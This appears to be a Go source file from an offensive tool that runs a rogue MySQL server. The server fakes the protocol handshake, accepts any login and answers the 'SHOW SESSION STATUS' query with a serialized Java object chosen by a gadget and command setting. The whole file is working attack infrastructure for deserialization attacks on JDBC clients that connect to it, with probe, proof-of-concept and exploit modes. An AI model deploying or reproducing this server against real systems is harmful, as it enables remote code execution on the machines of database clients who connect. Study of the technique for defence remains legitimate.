package server

import (
	"crypto/tls"
	"encoding/binary"
	"log"
	"net"

	"github.com/cokeBeer/logi/pkg/certs"
)

// StartMySQL starts a MySQL server hosting serialized object
func (s *Server) StartMySQL() {

	addr := net.JoinHostPort(s.ip, s.port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("MySQL listen on %v\n", addr)

	if s.Mode == MODE_PROBE {
		log.Printf("Run mode probe")
		log.Printf("Use domain: %v\n", s.Domain)
		log.Printf("Load dict: %v, class num: %v\n", s.Dict.Name(), s.Dict.Len())
	} else if s.Mode == MODE_EXPLOIT {
		log.Printf("Run mode exploit")
		log.Printf("Load gadget: %v, command: %v\n", s.Gadget.Name(), s.Command)
	} else {
		log.Printf("Run mode poc")
		log.Printf("Use domain: %v\n", s.Domain)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("a connect came: %v\n", conn.RemoteAddr())
		go s.handleMySQL(conn)
	}

}

func (s *Server) handleMySQL(conn net.Conn) {
	defer log.Printf("a mysql client left: %s\n", conn.RemoteAddr())
	defer conn.Close()

	// server hello
	conn.Write([]byte("J\x00\x00\x00\n8.0.23\x00\x16\x00\x00\x00Im(2Nv6\x02\x00\xff\xff\xff\x02\x00\xff\xcf\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0027C\x17M\x01c9\x1b#\nD\x00caching_sha2_password\x00"))

	// handle login request
	buf := make([]byte, 3)
	conn.Read(buf)

	l1 := uint24(buf)
	buf = make([]byte, l1+1)
	conn.Read(buf)

	// take length of login request equals 32 as a flag of ssl
	// in this case username = null
	if l1 == 32 {

		_, err := certs.New(&certs.Options{
			CacheSize: 256,
			Directory: ".",
		})
		if err != nil {
			log.Fatal(err)
		}

		cert, err := tls.LoadX509KeyPair("cacert.pem", "cakey.pem")
		if err != nil {
			log.Fatal(err)
		}

		cfg := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			InsecureSkipVerify: true,
		}

		tlsconn := tls.Server(conn, cfg)

		// say hello again
		tlsconn.Write([]byte("J\x00\x00\x00\n8.0.23\x00\x16\x00\x00\x00Im(2Nv6\x02\x00\xff\xff\xff\x02\x00\xff\xcf\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0027C\x17M\x01c9\x1b#\nD\x00caching_sha2_password\x00"))

		// handle login request
		buf = make([]byte, 3)
		tlsconn.Read(buf)

		l2 := uint24(buf)
		buf = make([]byte, l2+1)
		tlsconn.Read(buf)

		s.doHandleMySQL(tlsconn, buf)

	} else {

		s.doHandleMySQL(conn, buf)

	}

}

func (s *Server) doHandleMySQL(conn net.Conn, req []byte) {
	// response ok as login success
	conn.Write([]byte("\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00"))

	_, _, classname := parseLogin(req)

	serobj := s.payloadByMode(classname)

	// handle first query
	buf := make([]byte, 3)
	conn.Read(buf)

	l2 := uint24(buf)
	buf = make([]byte, l2+1)
	conn.Read(buf)

	// response
	conn.Write([]byte("\x01\x00\x00\x01\x11.\x00\x00\x02\x03def\x00\x00\x00\x18auto_increment_increment\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00*\x00\x00\x03\x03def\x00\x00\x00\x14character_set_client\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00.\x00\x00\x04\x03def\x00\x00\x00\x18character_set_connection\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00+\x00\x00\x05\x03def\x00\x00\x00\x15character_set_results\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00*\x00\x00\x06\x03def\x00\x00\x00\x14character_set_server\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00&\x00\x00\x07\x03def\x00\x00\x00\x10collation_server\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00\"\x00\x00\x08\x03def\x00\x00\x00\x0cinit_connect\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00)\x00\x00\t\x03def\x00\x00\x00\x13interactive_timeout\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00\x1d\x00\x00\n\x03def\x00\x00\x00\x07license\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00,\x00\x00\x0b\x03def\x00\x00\x00\x16lower_case_table_names\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00(\x00\x00\x0c\x03def\x00\x00\x00\x12max_allowed_packet\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00'\x00\x00\r\x03def\x00\x00\x00\x11net_write_timeout\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00\x1e\x00\x00\x0e\x03def\x00\x00\x00\x08sql_mode\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00&\x00\x00\x0f\x03def\x00\x00\x00\x10system_time_zone\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00\x1f\x00\x00\x10\x03def\x00\x00\x00\ttime_zone\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00+\x00\x00\x11\x03def\x00\x00\x00\x15transaction_isolation\x00\x0c!\x00\xff\xff\x00\x00\xfd\x00\x00\x1f\x00\x00\"\x00\x00\x12\x03def\x00\x00\x00\x0cwait_timeout\x00\x0c?\x00\x15\x00\x00\x00\x08\xa0\x00\x00\x00\x00\xdc\x00\x00\x13\x011\x04utf8\x04utf8\x04utf8\x07utf8mb4\x12utf8mb4_0900_ai_ci\x00\x0528800\x03GPL\x012\x0867108864\x0260uONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION\x03CST\x06SYSTEM\x0fREPEATABLE-READ\x0528800\x07\x00\x00\x14\xfe\x00\x00\x02\x00\x00\x00"))

	for {

		// handle query request
		buf = make([]byte, 3)
		_, err := conn.Read(buf)
		if err != nil {
			break
		}

		l3 := uint24(buf)
		buf = make([]byte, l3+1)

		_, err = conn.Read(buf)
		if err != nil {
			break
		}

		query := string(buf[2 : l3+1])

		if query == "SHOW SESSION STATUS" {
			p := buildPacket(serobj)
			conn.Write(p)
		} else {
			// repsonse ok
			conn.Write([]byte("\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00"))
		}

	}

}

func parseLogin(req []byte) (string, string, string) {

	if len(req) <= 32 {
		return "", "", ""
	}

	data := req[33:]
	datalen := len(data)

	var (
		username = ""
		password = ""
		schema   = ""
	)

	i := 0
	for i < datalen {
		if data[i] == '\x00' {
			username = string(data[:i])
			data = data[i+1:]
			datalen = len(data)
			break
		}
		i++
	}

	if len(data) > 0 {
		l := uint8(data[0])
		if l != 1 {
			password = string(data[1 : 1+int(l)])
		}
		data = data[1+int(l):]
		datalen = len(data)
	}

	i = 0
	for i < datalen {
		if data[i] == '\x00' {
			schema = string(data[:i])
			break
		}
		i++
	}
	return username, password, schema

}

func buildPacket(serobj []byte) []byte {

	var (
		// 2 fields
		p1 = []byte("\x01\x02")
		// def of field 1
		p2 = []byte("\x02\x03def\x01s\x01t\x01t\x02f1\x02f1\x0c?\x00\xff\xff\x00\x00\xfc\x90\x00\x00\x00\x00")
		// def of field 2
		p3 = []byte("\x03\x03def\x01s\x01t\x01t\x02f2\x02f2\x0c\xff\x00\xfc\x03\x00\x00\xfd\x00\x00\x00\x00\x00")
		// packet number 4 + ?
		p4_midfix = []byte("\x04\xfc")
		// data of field 2
		p4_postfix = []byte("\x04foo")
		// eof packet
		p5 = []byte("\x05\xfe\x00\x00\x02\x00\x00\x00")
	)

	serobj = append(serobj)

	buf := make([]byte, 0)

	buf = append(p5, buf...)
	buf = append(make([]byte, 3), buf...)
	putUint24(buf, len(p5)-1)

	l := len(serobj) + len(p4_postfix)
	buf = append(p4_postfix, buf...)
	buf = append(serobj, buf...)

	buf = append(make([]byte, 2), buf...)
	binary.LittleEndian.PutUint16(buf, uint16(l))

	buf = append(p4_midfix, buf...)

	buf = append(make([]byte, 3), buf...)
	putUint24(buf, l+3)

	buf = append(p3, buf...)
	buf = append(make([]byte, 3), buf...)
	putUint24(buf, len(p3)-1)

	buf = append(p2, buf...)
	buf = append(make([]byte, 3), buf...)
	putUint24(buf, len(p2)-1)

	buf = append(p1, buf...)
	buf = append(make([]byte, 3), buf...)
	putUint24(buf, len(p1)-1)

	return buf

}

// this uint24 use little endian to get int value from [3]byte
func uint24(b []byte) int {
	_ = b[2] // bounds check hint to compiler; see golang.org/issue/14808
	return int(b[0]) | int(b[1])<<8 | int(b[2])<<16
}

// this putUint24 use little endian to put int value in [3]byte
func putUint24(b []byte, v int) {
	_ = b[2] // early bounds check to guarantee safety of writes below
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
}
